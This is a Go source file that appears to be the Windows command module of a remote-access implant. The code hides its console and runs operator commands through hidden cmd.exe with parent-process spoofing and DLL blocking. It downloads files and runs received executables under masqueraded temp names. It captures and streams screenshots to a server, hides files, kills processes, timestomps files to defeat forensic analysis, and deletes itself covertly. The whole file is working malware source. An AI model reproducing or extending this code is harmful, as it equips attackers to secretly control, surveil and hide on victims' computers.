//go:build windows
// +build windows

package commands

import (
	"bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"image"
	"image/jpeg"
	"implant/core/communication"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32          = windows.NewLazySystemDLL("kernel32.dll")
	user32            = windows.NewLazyDLL("user32.dll")
	gdi32             = windows.NewLazyDLL("gdi32.dll")
	getConsoleWindow  = kernel32.NewProc("GetConsoleWindow")
	showWindow        = user32.NewProc("ShowWindow")
	SetThreadPriority = kernel32.NewProc("SetThreadPriority")
	// 屏幕截图相关API
	getDC              = user32.NewProc("GetDC")
	releaseDC          = user32.NewProc("ReleaseDC")
	getSystemMetrics   = user32.NewProc("GetSystemMetrics")
	createCompatibleDC = gdi32.NewProc("CreateCompatibleDC")
	selectObject       = gdi32.NewProc("SelectObject")
	bitBlt             = gdi32.NewProc("BitBlt")
	stretchBlt         = gdi32.NewProc("StretchBlt")
	deleteObject       = gdi32.NewProc("DeleteObject")
	deleteDC           = gdi32.NewProc("DeleteDC")
	createDIBSection   = gdi32.NewProc("CreateDIBSection")
	// 文件时间修改相关API
	procCreateFileW = kernel32.NewProc("CreateFileW")
	procSetFileTime = kernel32.NewProc("SetFileTime")
	procCloseHandle = kernel32.NewProc("CloseHandle")
)

// 交互式Shell会话管理
var (
	interactiveCmd      *exec.Cmd
	interactiveCmdMutex sync.Mutex
	isInteractiveMode   bool
	interactiveStdin    io.WriteCloser
)

func HideConsole() error {
	if getConsoleWindow.Find() == nil && showWindow.Find() == nil {
		hwnd, _, _ := getConsoleWindow.Call()
		if hwnd != 0 {
			_, _, err := showWindow.Call(hwnd, windows.SW_HIDE)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

// windows 下设置不需要DPI缩放
func SetProcessDPIAware() error {
	_, _, err := user32.NewProc("SetProcessDPIAware").Call(0)
	if err != nil {
		return err
	}
	return nil
}

// handleGoDownload 处理go-download命令（参数支持引号包裹）
func handleGoDownload(cmdStr string) ([]byte, error) {
	// 解析命令：go-download <url> <filepath>
	parts := strings.Fields(cmdStr)
	if len(parts) < 3 {
		return nil, errors.New("go-download命令格式错误，正确格式：go-download <url> <filepath>")
	}

	// 剥离参数首尾引号（兼容前端带引号传参）
	stripQuotes := func(s string) string {
		s = strings.TrimPrefix(s, `"`)
		s = strings.TrimSuffix(s, `"`)
		return s
	}

	url := stripQuotes(parts[1])
	filePath := stripQuotes(strings.Join(parts[2:], " ")) // 支持路径中包含空格

	// 调用下载函数
	return ExecuteDownload(url, filePath)
}

func Shell(path string, args []byte) ([]byte, error) {
	return Run(append([]byte(path), args...))
}

// windows 下的命令执行函数
func Run(b []byte) ([]byte, error) {
	// 检查是否是go-download命令
	cmdStr := string(b)
	if strings.HasPrefix(cmdStr, "go-download ") {
		return handleGoDownload(cmdStr)
	}

	var (
		sI     windows.StartupInfo
		pI     windows.ProcessInformation
		status = windows.CREATE_NO_WINDOW

		hWPipe windows.Handle
		hRPipe windows.Handle
	)

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: nil,
		InheritHandle:      1, //true
	}

	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
	if err != nil {
		return nil, err
	}

	sI.Flags = windows.STARTF_USESTDHANDLES
	sI.StdErr = hWPipe
	sI.StdOutput = hWPipe
	sI.ShowWindow = windows.SW_HIDE

	command := "C:\\windows\\system32\\cmd.exe /C " + string(b)

	program, _ := windows.UTF16PtrFromString(command)

	// 子进程属性：父进程伪造 + BlockDLLs（主机对抗未启用时返回 nil，退化为普通创建）
	ca := newChildAttrs()
	defer ca.Close()

	err = createProcessWithAttrs(program, true, uint32(status), &sI, &pI, ca)
	if err != nil {
		return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
	}

	_, err = windows.WaitForSingleObject(pI.Process, 10*1000)
	if err != nil {
		return nil, errors.New("[-] WaitForSingleObject(Process) error : " + err.Error())
	}

	var read windows.Overlapped
	buf := make([]byte, 1024*50) // 循环外分配一次复用，避免每轮 50KB 分配压 GC
	firstTime := true
	lastTime := false

	for !lastTime {
		event, _ := windows.WaitForSingleObject(pI.Process, 0)
		if event == windows.WAIT_OBJECT_0 || event == windows.WAIT_FAILED {
			lastTime = true
		}
		_ = windows.ReadFile(hRPipe, buf, nil, &read)
		if read.InternalHigh > 0 {
			if firstTime {
				communication.DataProcess(0, buf[:read.InternalHigh])
				firstTime = false
			} else {
				communication.DataProcess(0, append([]byte("[+] "+string(b)+" :\n"), buf[:read.InternalHigh]...))
				if lastTime {
					communication.DataProcess(0, []byte("-----------------------------------end-----------------------------------"))
				}
			}
		}
		time.Sleep(50 * time.Millisecond)
	}

	err = windows.CloseHandle(pI.Process)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(pI.Thread)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(hWPipe)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(hRPipe)
	if err != nil {
		return nil, err
	}

	//return buf[:read.InternalHigh], nil
	return []byte("success"), nil
}

// DeleteSelf 删除进程文件（在线）：定位实际映像文件 → 直接删除/改名解锁删除 → 失败挂重试器。
//
// os.Executable() 无法保证路径仍指向正确的可执行文件（改名后/被移动后可能失效），
// 因此先构建候选文件集（当前映像 + 候选目录中匹配的自我改名残留），逐个尝试删除；
// 全部失败才挂后台重试删除器（进程退出后自动清理，不留常驻）。
// 回包含诊断信息（候选路径/各步骤结果），前端可直接看到处理过程。
func DeleteSelf() ([]byte, error) {
	diag := []string{}
	candidates := locateSelfFiles()
	if len(candidates) == 0 {
		return []byte("delete: 未定位到客户端文件（可能已被移动或删除）"), nil
	}

	for _, path := range candidates {
		path = filepath.Clean(path)
		if _, err := os.Stat(path); err != nil {
			diag = append(diag, fmt.Sprintf("skip(absent):%s", filepath.Base(path)))
			continue
		}
		// 直接删除（运行中映像含 FILE_SHARE_DELETE，通常成功）
		if err := os.Remove(path); err == nil {
			diag = append(diag, fmt.Sprintf("remove=ok:%s", filepath.Base(path)))
			return []byte(strings.Join(diag, " | ") + " | success"), nil
		} else {
			diag = append(diag, fmt.Sprintf("remove=failed:%v", err))
		}
	}

	// 删除被锁：对主映像尝试改名解锁（释放原路径），改名文件交由重试器清理
	if len(candidates) > 0 {
		primary := filepath.Clean(candidates[0])
		if _, err := os.Stat(primary); err == nil {
			tmpName := fmt.Sprintf("~%s_%08x.tmp", masquerade(""), time.Now().UnixNano()&0xFFFFFFFF)
			tmpPath := filepath.Join(filepath.Dir(primary), tmpName)
			if rerr := os.Rename(primary, tmpPath); rerr == nil {
				diag = append(diag, "rename=ok")
				scheduleRetryDelete(tmpPath)
				diag = append(diag, "retry-scheduled")
				return []byte(strings.Join(diag, " | ") + " | deferred"), nil
			} else {
				diag = append(diag, fmt.Sprintf("rename=failed:%v", rerr))
			}
		}
	}

	// 全部失败：对每个候选挂重试删除器（进程退出后自动清理）
	for _, path := range candidates {
		if _, err := os.Stat(path); err == nil {
			scheduleRetryDelete(filepath.Clean(path))
		}
	}
	diag = append(diag, "retry-scheduled(all)")
	return []byte(strings.Join(diag, " | ") + " | deferred"), nil
}

// locateSelfFiles 构建候选删除文件集：
//  1. os.Executable()（当前映像路径，可能失效）
//  2. 候选目录（用户 temp / 桌面 / OneDrive 桌面）中匹配 ~svc_*.tmp / ~<masq>_*.tmp、
//     且创建时间在进程启动前后 5 分钟内的自我改名残留文件（覆盖"文件被移动"场景）。
//
// 去重返回。
func locateSelfFiles() []string {
	set := map[string]bool{}
	var out []string
	add := func(p string) {
		if p == "" {
			return
		}
		p = filepath.Clean(p)
		if !set[p] {
			set[p] = true
			out = append(out, p)
		}
	}
	if exe, err := os.Executable(); err == nil {
		add(exe)
	}
	start := time.Now().Add(-5 * time.Minute)
	dirs := []string{os.TempDir()}
	if h, err := os.UserHomeDir(); err == nil && h != "" {
		dirs = append(dirs, filepath.Join(h, "Desktop"), filepath.Join(h, "OneDrive", "Desktop"))
	}
	for _, dir := range dirs {
		for _, pat := range []string{"~svc_*.tmp", fmt.Sprintf("~%s_*.tmp", masquerade(""))} {
			matches, _ := filepath.Glob(filepath.Join(dir, pat))
			for _, m := range matches {
				if st, err := os.Stat(m); err == nil && st.ModTime().After(start) {
					add(m)
				}
			}
		}
	}
	return out
}

// scheduleRetryDelete 启动隐藏 cmd 循环删除器：每 2 秒尝试一次删除，成功即退出。
// 进程在线期间删除被锁而失败（静默），进程退出后首个周期删除成功 → cmd 退出，不常驻。
// 最多 150 次（5 分钟）后放弃。
func scheduleRetryDelete(path string) {
	delCmd := fmt.Sprintf(
		`for /L %%%%i in (1,1,150) do @(del /f /q "%s" 2>nul && exit /b 0) & ping -n 2 127.0.0.1 >nul`,
		path)
	cmd := exec.Command("cmd", "/c", delCmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000} // CREATE_NO_WINDOW
	_ = cmd.Start()
}

// DeleteSelfAndExit 删除进程文件并退出（"删除客户端"流程）：
// 重命名解锁 + 隐藏 cmd 延迟删除（进程退出后执行成功）+ 调用方负责 os.Exit。
func DeleteSelfAndExit() ([]byte, error) {
	filename, err := os.Executable()
	if err != nil {
		return nil, err
	}

	dir := filepath.Dir(filename)
	tmpName := fmt.Sprintf("~%s_%08x.tmp", masquerade(""), time.Now().UnixNano()&0xFFFFFFFF)
	tmpPath := filepath.Join(dir, tmpName)

	// 重命名自身（运行中的 exe 可重命名）
	if err := os.Rename(filename, tmpPath); err != nil {
		// 重命名失败（如目录保护），回退旧方案：cmd del 竞速
		return legacyDeleteSelf(filename)
	}

	// 立即尝试删除（退出前若可删则直接删掉，无需延迟器）
	if err := os.Remove(tmpPath); err == nil {
		return []byte("success delete"), nil
	}

	// 回退：隐藏 cmd 延迟删除临时文件（3 秒后执行；本进程退出后即可删除成功）
	scheduleRetryDelete(tmpPath)

	return []byte("success delete (deferred)"), nil
}

// legacyDeleteSelf 旧方案：cmd /c del 竞速（优先级反转），仅作为重命名失败的回退
func legacyDeleteSelf(filename string) ([]byte, error) {
	program, _ := syscall.UTF16PtrFromString("c" + "m" + "d" + "." + "e" + "x" + "e" + " /c" + " d" + "e" + "l " + filename)
	err := windows.CreateProcess(
		nil,
		program,
		nil,
		nil,
		true,
		windows.CREATE_NO_WINDOW,
		nil,
		nil,
		&windows.StartupInfo{ShowWindow: windows.SW_HIDE},
		&windows.ProcessInformation{})
	if err != nil {
		return nil, errors.New("could not delete " + filename + " " + err.Error())
	}
	return []byte("success delete (legacy)"), nil
}
// Execute 执行 `execute "<程序>" [参数...]`：无窗口后台启动，不等待退出。
//
// 原实现把整串（含引号与参数）当成程序路径交给 CreateProcess，
// 带参数或路径含空格时必然启动失败。这里先按命令行拆分，再按 Windows 的
// 引号/反斜杠规则重新拼成 lpCommandLine；仍然走 createProcessWithAttrs，
// 保留 PPID 伪装与 BlockDLLs 等属性（源码棘轮测试也要求主 spawn 路径都走它）。
func Execute(b []byte) ([]byte, error) {
	parts := SplitCommandLine(string(b))
	if len(parts) == 0 {
		return nil, errors.New("execute: empty command")
	}
	commandLine := buildWindowsCommandLine(parts)
	cmdLinePtr, err := syscall.UTF16PtrFromString(commandLine)
	if err != nil {
		return nil, errors.New("could not spawn " + commandLine + ": " + err.Error())
	}

	var sI windows.StartupInfo
	var pI windows.ProcessInformation
	sI.ShowWindow = windows.SW_HIDE

	ca := newChildAttrs()
	defer ca.Close()

	if err := createProcessWithAttrs(cmdLinePtr, true, uint32(windows.CREATE_NO_WINDOW), &sI, &pI, ca); err != nil {
		return nil, errors.New("could not spawn " + commandLine + " " + err.Error())
	}
	// 句柄不再使用：关闭，避免每个任务泄漏两个句柄
	windows.CloseHandle(pI.Thread)
	windows.CloseHandle(pI.Process)

	return []byte("success execute " + commandLine), nil
}

// buildWindowsCommandLine 按 MSVC 运行库规则拼 lpCommandLine：
// 含空白或引号的参数加双引号，参数内的引号前补反斜杠。
func buildWindowsCommandLine(parts []string) string {
	var b strings.Builder
	for i, p := range parts {
		if i > 0 {
			b.WriteByte(' ')
		}
		if p != "" && !strings.ContainsAny(p, " \t\n\v\"") {
			b.WriteString(p)
			continue
		}
		b.WriteByte('"')
		backslashes := 0
		for _, r := range p {
			if r == '\\' {
				backslashes++
				b.WriteRune(r)
				continue
			}
			if r == '"' {
				b.WriteString(strings.Repeat(`\`, backslashes+1))
			}
			backslashes = 0
			b.WriteRune(r)
		}
		b.WriteString(strings.Repeat(`\`, backslashes))
		b.WriteByte('"')
	}
	return b.String()
}
func KillProcess(pid uint32) ([]byte, error) {
	proc, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)
	if err != nil {
		return nil, err
	}
	err = windows.TerminateProcess(proc, 0)
	if err != nil {
		return nil, err
	}
	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
}
func Drives() ([]byte, error) {
	drivers := ""
	// 定义所有可能的盘符
	driveLetters := "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	for _, letter := range driveLetters {
		path := string(letter) + ":\\"
		// 检查是否是有效路径
		if _, err := os.Stat(path); err == nil {
			drivers += string(letter)
		}
	}

	//bitMask, err := windows.GetLogicalDrives()
	//if err != nil {
	//	return nil, err
	//}
	result := []byte(drivers)
	return result, nil
}

// HideFile 在Windows上隐藏文件（使用API避免阻塞）
func HideFile(filePath string) error {
	// 使用Windows API直接设置文件属性，避免调用cmd阻塞
	filename, err := syscall.UTF16PtrFromString(filePath)
	if err != nil {
		return err
	}

	// 获取当前文件属性
	attrs, err := syscall.GetFileAttributes(filename)
	if err != nil {
		return err
	}

	// 添加隐藏属性
	newAttrs := attrs | syscall.FILE_ATTRIBUTE_HIDDEN
	err = syscall.SetFileAttributes(filename, newAttrs)
	return err
}

// UnhideFile 在Windows上取消隐藏文件（使用API避免阻塞）
func UnhideFile(filePath string) error {
	// 使用Windows API直接设置文件属性，避免调用cmd阻塞
	filename, err := syscall.UTF16PtrFromString(filePath)
	if err != nil {
		return err
	}

	// 获取当前文件属性
	attrs, err := syscall.GetFileAttributes(filename)
	if err != nil {
		return err
	}

	// 移除隐藏属性
	newAttrs := attrs &^ syscall.FILE_ATTRIBUTE_HIDDEN
	err = syscall.SetFileAttributes(filename, newAttrs)
	return err
}

// 旧的交互式Shell实现已移除，现在使用双引擎架构
// 请参考 dual_interactive_windows.go 文件

// BITMAPINFOHEADER Windows位图信息头结构
type BITMAPINFOHEADER struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

// BITMAPINFO Windows位图信息结构
type BITMAPINFO struct {
	BmiHeader BITMAPINFOHEADER
	BmiColors [1]uint32
}

// TakeScreenshot 截取屏幕截图
// TakeScreenshot 截取屏幕并按档位缩放/调质（quality: 0=低 1=中 2=高）。
// 低/中档用 GDI StretchBlt 在拷贝时直接缩放（避免大屏全分辨率像素拷贝 + 缩放两遍开销）。
func TakeScreenshot(quality int) ([]byte, error) {
	// 获取屏幕尺寸
	width, _, _ := getSystemMetrics.Call(0)  // SM_CXSCREEN
	height, _, _ := getSystemMetrics.Call(1) // SM_CYSCREEN

	if width == 0 || height == 0 {
		return nil, errors.New("无法获取屏幕尺寸")
	}

	// 档位目标分辨率（0 低 → 50%, 1 中 → 75%, 2 高 → 100%）
	var targetW, targetH int
	var jpegQuality int
	switch quality {
	case 0:
		targetW, targetH = int(width)/2, int(height)/2
		jpegQuality = 60
	case 2:
		targetW, targetH = int(width), int(height)
		jpegQuality = 90
	default: // 中
		targetW, targetH = int(width)*3/4, int(height)*3/4
		jpegQuality = 75
	}
	if targetW < 1 || targetH < 1 {
		targetW, targetH = int(width), int(height)
	}

	// 获取屏幕DC
	screenDC, _, _ := getDC.Call(0)
	if screenDC == 0 {
		return nil, errors.New("无法获取屏幕设备上下文")
	}
	defer releaseDC.Call(0, screenDC)

	// 创建兼容DC
	memoryDC, _, _ := createCompatibleDC.Call(screenDC)
	if memoryDC == 0 {
		return nil, errors.New("无法创建兼容设备上下文")
	}
	defer deleteDC.Call(memoryDC)

	// 设置位图信息（按目标分辨率）
	bmi := BITMAPINFO{
		BmiHeader: BITMAPINFOHEADER{
			BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
			BiWidth:       int32(targetW),
			BiHeight:      -int32(targetH), // 负值表示自上而下的位图
			BiPlanes:      1,
			BiBitCount:    32, // 32位BGRA
			BiCompression: 0,  // BI_RGB
		},
	}

	// 创建DIB位图
	var bits uintptr
	hBitmap, _, _ := createDIBSection.Call(
		memoryDC,
		uintptr(unsafe.Pointer(&bmi)),
		0, // DIB_RGB_COLORS
		uintptr(unsafe.Pointer(&bits)),
		0,
		0,
	)
	if hBitmap == 0 {
		return nil, errors.New("无法创建DIB位图")
	}
	defer deleteObject.Call(hBitmap)

	// 选择位图到内存DC
	oldBitmap, _, _ := selectObject.Call(memoryDC, hBitmap)
	defer selectObject.Call(memoryDC, oldBitmap)

	// 复制屏幕内容到位图（低/中档用 StretchBlt 缩放拷贝，高档 BitBlt 原样拷贝）
	const SRCCOPY = 0x00CC0020
	var ret uintptr
	if targetW == int(width) && targetH == int(height) {
		ret, _, _ = bitBlt.Call(
			memoryDC,
			0, 0,
			width, height,
			screenDC,
			0, 0,
			SRCCOPY,
		)
	} else {
		ret, _, _ = stretchBlt.Call(
			memoryDC,
			0, 0,
			uintptr(targetW), uintptr(targetH),
			screenDC,
			0, 0,
			width, height,
			SRCCOPY,
		)
	}
	if ret == 0 {
		return nil, errors.New("屏幕内容复制失败")
	}

	// 将位图数据转换为图像
	bytesPerPixel := 4 // BGRA
	imageSize := targetW * targetH * bytesPerPixel
	pixelData := (*[1 << 30]byte)(unsafe.Pointer(bits))[:imageSize:imageSize]

	// 创建RGBA图像
	img := image.NewRGBA(image.Rect(0, 0, targetW, targetH))

	// 转换BGRA到RGBA
	for y := 0; y < targetH; y++ {
		for x := 0; x < targetW; x++ {
			offset := (y*targetW + x) * 4
			if offset+3 < len(pixelData) {
				b := pixelData[offset]
				g := pixelData[offset+1]
				r := pixelData[offset+2]
				a := pixelData[offset+3]

				pixelIndex := y*img.Stride + x*4
				img.Pix[pixelIndex] = r   // R
				img.Pix[pixelIndex+1] = g // G
				img.Pix[pixelIndex+2] = b // B
				img.Pix[pixelIndex+3] = a // A
			}
		}
	}

	// 将图像编码为JPEG（体积比PNG小10倍以上，带宽友好；质量随档位）
	var buf bytes.Buffer
	err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: jpegQuality})
	if err != nil {
		return nil, err
	}

	// 转换为base64
	base64Data := base64.StdEncoding.EncodeToString(buf.Bytes())
	return []byte("data:image/jpeg;base64," + base64Data), nil
}

// ================ Windows 文件时间修改功能 ================

// ModifyFileTimeAdvanced 在Windows上修改文件的创建时间、访问时间和修改时间
func ModifyFileTimeAdvanced(filePath string, newTime time.Time) error {
	// 将文件路径转换为UTF16指针
	pathPtr, err := syscall.UTF16PtrFromString(filePath)
	if err != nil {
		return err
	}

	// 打开文件句柄
	handle, _, _ := procCreateFileW.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		syscall.GENERIC_WRITE, // 需要写权限来修改文件时间
		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
		0,
		syscall.OPEN_EXISTING,
		syscall.FILE_ATTRIBUTE_NORMAL,
		0,
	)

	if handle == uintptr(syscall.InvalidHandle) {
		return errors.New("无法打开文件句柄")
	}

	defer procCloseHandle.Call(handle)

	// 将Go时间转换为Windows FILETIME
	filetime := timeToFiletime(newTime)

	// 修改文件时间（创建时间、访问时间、修改时间都设置为同一时间）
	ret, _, _ := procSetFileTime.Call(
		handle,
		uintptr(unsafe.Pointer(&filetime)), // 创建时间
		uintptr(unsafe.Pointer(&filetime)), // 访问时间
		uintptr(unsafe.Pointer(&filetime)), // 修改时间
	)

	if ret == 0 {
		return errors.New("设置文件时间失败")
	}

	return nil
}

// timeToFiletime 将Go的time.Time转换为Windows的FILETIME
func timeToFiletime(t time.Time) syscall.Filetime {
	// Windows FILETIME是从1601年1月1日开始的100纳秒间隔数
	// Unix时间是从1970年1月1日开始的
	// 需要转换这个差值
	ft := t.UnixNano()/100 + 116444736000000000
	return syscall.Filetime{
		LowDateTime:  uint32(ft & 0xffffffff),
		HighDateTime: uint32(ft >> 32),
	}
}

// ================ 屏幕监控功能 ================

// ScreenMonitor 屏幕监控管理器
type ScreenMonitor struct {
	isRunning   bool
	stopChannel chan bool
	frameRate   int // 帧率，每秒帧数
	mutex       sync.Mutex
}

// 全局监控实例
var globalMonitor = &ScreenMonitor{
	isRunning:   false,
	stopChannel: make(chan bool, 1),
	frameRate:   5, // 默认5FPS
}

// StartScreenMonitor 开始屏幕监控（仅标记为可用状态，不自动发送帧）
func StartScreenMonitor(frameRate int) error {
	globalMonitor.mutex.Lock()
	defer globalMonitor.mutex.Unlock()

	if globalMonitor.isRunning {
		return errors.New("屏幕监控已经在运行中")
	}

	if frameRate <= 0 || frameRate > 30 {
		frameRate = 5 // 默认5FPS
	}

	globalMonitor.frameRate = frameRate
	globalMonitor.isRunning = true
	// 不再启动自动循环，改为手动请求模式
	// go screenMonitorLoop()

	return nil
}

// StopScreenMonitor 停止屏幕监控
func StopScreenMonitor() error {
	globalMonitor.mutex.Lock()
	defer globalMonitor.mutex.Unlock()

	if !globalMonitor.isRunning {
		return errors.New("屏幕监控未在运行")
	}

	globalMonitor.isRunning = false

	// 发送停止信号
	select {
	case globalMonitor.stopChannel <- true:
	default:
	}

	return nil
}

// GetMonitorFrame 手动获取一帧监控数据
func GetMonitorFrame() ([]byte, error) {
	globalMonitor.mutex.Lock()
	defer globalMonitor.mutex.Unlock()

	if !globalMonitor.isRunning {
		return nil, errors.New("屏幕监控未启动")
	}

	// 捕获屏幕帧
	frameData, err := captureOptimizedFrame()
	if err != nil {
		return nil, err
	}

	return frameData, nil
}

// screenMonitorLoop 监控循环
func screenMonitorLoop() {
	frameInterval := time.Duration(1000/globalMonitor.frameRate) * time.Millisecond
	ticker := time.NewTicker(frameInterval)
	defer ticker.Stop()

	for {
		select {
		case <-globalMonitor.stopChannel:
			return
		case <-ticker.C:
			if !globalMonitor.isRunning {
				return
			}

			// 捕获屏幕帧
			frameData, err := captureOptimizedFrame()
			if err != nil {
				continue // 跳过错误帧
			}

			// 发送帧数据到服务端
			communication.DataProcess(49, frameData) // MONITOR_FRAME = 49
		}
	}
}

// captureOptimizedFrame 捕获优化的屏幕帧（压缩质量）
func captureOptimizedFrame() ([]byte, error) {
	// 获取屏幕尺寸
	width, _, _ := getSystemMetrics.Call(0)  // SM_CXSCREEN
	height, _, _ := getSystemMetrics.Call(1) // SM_CYSCREEN

	if width == 0 || height == 0 {
		return nil, errors.New("无法获取屏幕尺寸")
	}

	// 降低分辨率以提高性能（可配置）
	scaleFactor := 1.0 // 提升为100%分辨率，获得高清画面
	newWidth := int(float64(width) * scaleFactor)
	newHeight := int(float64(height) * scaleFactor)

	// 获取屏幕DC
	screenDC, _, _ := getDC.Call(0)
	if screenDC == 0 {
		return nil, errors.New("无法获取屏幕设备上下文")
	}
	defer releaseDC.Call(0, screenDC)

	// 创建兼容DC
	memoryDC, _, _ := createCompatibleDC.Call(screenDC)
	if memoryDC == 0 {
		return nil, errors.New("无法创建兼容设备上下文")
	}
	defer deleteDC.Call(memoryDC)

	// 设置位图信息（降低分辨率）
	bmi := BITMAPINFO{
		BmiHeader: BITMAPINFOHEADER{
			BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
			BiWidth:       int32(newWidth),
			BiHeight:      -int32(newHeight), // 负值表示自上而下的位图
			BiPlanes:      1,
			BiBitCount:    32, // 32位BGRA，提升画面质量
			BiCompression: 0,  // BI_RGB
		},
	}

	// 创建DIB位图
	var bits uintptr
	hBitmap, _, _ := createDIBSection.Call(
		memoryDC,
		uintptr(unsafe.Pointer(&bmi)),
		0, // DIB_RGB_COLORS
		uintptr(unsafe.Pointer(&bits)),
		0,
		0,
	)
	if hBitmap == 0 {
		return nil, errors.New("无法创建DIB位图")
	}
	defer deleteObject.Call(hBitmap)

	// 选择位图到内存DC
	oldBitmap, _, _ := selectObject.Call(memoryDC, hBitmap)
	defer selectObject.Call(memoryDC, oldBitmap)

	// 使用StretchBlt进行缩放复制
	const SRCCOPY = 0x00CC0020
	stretchBlt := gdi32.NewProc("StretchBlt")
	ret, _, _ := stretchBlt.Call(
		memoryDC,
		0, 0,
		uintptr(newWidth), uintptr(newHeight),
		screenDC,
		0, 0,
		width, height,
		SRCCOPY,
	)
	if ret == 0 {
		return nil, errors.New("屏幕内容缩放复制失败")
	}

	// 将位图数据转换为图像
	bytesPerPixel := 4 // BGRA
	imageSize := newWidth * newHeight * bytesPerPixel
	pixelData := (*[1 << 30]byte)(unsafe.Pointer(bits))[:imageSize:imageSize]

	// 创建RGBA图像
	img := image.NewRGBA(image.Rect(0, 0, newWidth, newHeight))

	// 转换BGRA到RGBA（32位高质量）
	for y := 0; y < newHeight; y++ {
		for x := 0; x < newWidth; x++ {
			offset := (y*newWidth + x) * 4
			if offset+3 < len(pixelData) {
				b := pixelData[offset]
				g := pixelData[offset+1]
				r := pixelData[offset+2]
				a := pixelData[offset+3]

				pixelIndex := y*img.Stride + x*4
				img.Pix[pixelIndex] = r   // R
				img.Pix[pixelIndex+1] = g // G
				img.Pix[pixelIndex+2] = b // B
				img.Pix[pixelIndex+3] = a // A
			}
		}
	}

	// 将图像编码为JPEG以减少数据量（体积比PNG小10倍以上）
	var buf bytes.Buffer
	err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 75})
	if err != nil {
		return nil, err
	}

	// 转换为base64
	base64Data := base64.StdEncoding.EncodeToString(buf.Bytes())
	return []byte("data:image/jpeg;base64," + base64Data), nil
}

// 交互式 Shell（Windows ConPTY）实现见 conpty_windows.go

func ExecuteLinuxScript(scriptBytes []byte, args string) ([]byte, error) {
	return nil, errors.New("Linux脚本执行功能在当前平台不可用")
}

func ExecuteLinuxBin(binBytes []byte, args string) ([]byte, error) {
	return nil, errors.New("Linux二进制执行功能在当前平台不可用")
}

// ExecuteFile 文件执行(写临时文件->执行->捕获输出->删除;支持 Go/Rust PE)
func ExecuteFile(fileBytes []byte, args string) ([]byte, error) {
	tempDir := os.Getenv("TEMP")
	if tempDir == "" {
		tempDir = os.TempDir()
	}
	tmpFile := filepath.Join(tempDir, fmt.Sprintf("%s_exec_%d.exe", masquerade(""), time.Now().UnixNano()))
	if err := os.WriteFile(tmpFile, fileBytes, 0755); err != nil {
		return nil, err
	}
	defer os.Remove(tmpFile)
	// 直接 CreateProcess 执行临时文件，不再经过 cmd.exe：
	//   - 原实现 `cmd.exe /c "%s %s" 2>&1` 里路径与参数只是字符串拼接，
	//     临时目录/参数含空格或引号时会被 cmd 拆错，`& | > ^` 还会被当成
	//     shell 元字符执行；
	//   - stderr 已经通过 sI.StdErr 指向同一管道，不需要 2>&1。
	// 可执行文件路径用 syscall.EscapeArg 引起来；参数保留用户原始写法
	// （用户自己负责引号），不做二次拆分。
	cmdLine := syscall.EscapeArg(tmpFile)
	if trimmed := strings.TrimSpace(args); trimmed != "" {
		cmdLine += " " + trimmed
	}
	var sI windows.StartupInfo
	var pI windows.ProcessInformation
	status := uint32(windows.CREATE_NO_WINDOW)
	sI.Flags = windows.STARTF_USESTDHANDLES
	sI.ShowWindow = windows.SW_HIDE
	var hRPipe, hWPipe windows.Handle
	sa := windows.SecurityAttributes{Length: uint32(unsafe.Sizeof(windows.SecurityAttributes{})), InheritHandle: 1}
	if err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0); err != nil {
		return nil, err
	}
	defer windows.CloseHandle(hRPipe)
	sI.StdOutput = hWPipe
	sI.StdErr = hWPipe
	program, _ := windows.UTF16PtrFromString(cmdLine)
	ca := newChildAttrs()
	defer ca.Close()
	err := createProcessWithAttrs(program, true, status, &sI, &pI, ca)
	if err != nil {
		windows.CloseHandle(hWPipe)
		return nil, err
	}
	defer windows.CloseHandle(pI.Process)
	defer windows.CloseHandle(pI.Thread)
	windows.CloseHandle(hWPipe) // 关闭写端让 ReadFile 收到 EOF

	// 读管道放到 goroutine：原实现先 ReadFile 再检查 deadline，
	// 子进程不输出时 ReadFile 会一直阻塞，10 分钟超时永远不触发。
	type pipeReadResult struct {
		data []byte
		err  error
	}
	readDone := make(chan pipeReadResult, 1)
	go func() {
		var total []byte
		buf := make([]byte, 32*1024)
		for {
			var n uint32
			readErr := windows.ReadFile(hRPipe, buf, &n, nil)
			if n > 0 {
				total = append(total, buf[:n]...)
			}
			if readErr != nil {
				readDone <- pipeReadResult{data: total, err: readErr}
				return
			}
		}
	}()

	var total []byte
	timedOut := false
	select {
	case res := <-readDone:
		total = res.data
	case <-time.After(10 * time.Minute):
		timedOut = true
		_ = windows.TerminateProcess(pI.Process, 1)
		// 取消挂起的 ReadFile，避免子进程留下继承管道的孙进程时永远读不到 EOF
		_ = windows.CancelIoEx(hRPipe, nil)
		select {
		case res := <-readDone:
			total = res.data
		case <-time.After(3 * time.Second):
		}
		total = append(total, []byte("\n[!] execution timeout (10m), process terminated")...)
	}
	if len(total) > 0 {
		communication.ExecOutput(total)
	}
	if timedOut {
		return []byte("file execution timed out (10m)"), fmt.Errorf("file execution timeout (10m)")
	}
	return []byte("file executed"), nil
}
